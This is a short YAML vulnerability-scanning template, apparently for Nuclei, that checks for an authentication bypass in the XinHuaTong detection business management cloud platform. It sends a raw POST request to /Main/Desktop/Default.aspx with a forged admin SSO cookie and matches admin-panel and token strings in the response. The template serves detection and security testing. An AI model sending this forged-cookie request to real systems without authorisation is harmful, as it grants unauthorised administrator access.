id: poc-yaml-zhxht-default-aspx-login-bypass
info:
  name: XinHuaTong Default.aspx Login Bypass Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: auth-bypass
  metadata:
    description: |
      This template detects a login bypass vulnerability in the XinHuaTong Software Detection Business Management Cloud Platform via the /Main/Desktop/Default.aspx endpoint.

variables:
  t1: "{{gbk_encode('管理员')}}"
  t2: "{{gbk_encode('后台管理')}}"

http:
  - raw:
      - |
        POST /Main/Desktop/Default.aspx HTTP/1.1
        Host: {{Hostname}}
        Cookie: #_SSO_Login_UserID=admin
        Content-Length: 0
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "ZHXHT SOFTWARE"
          - "{{t1}}"
          - "{{t2}}"
          - "'token':"
          - "'userData':"
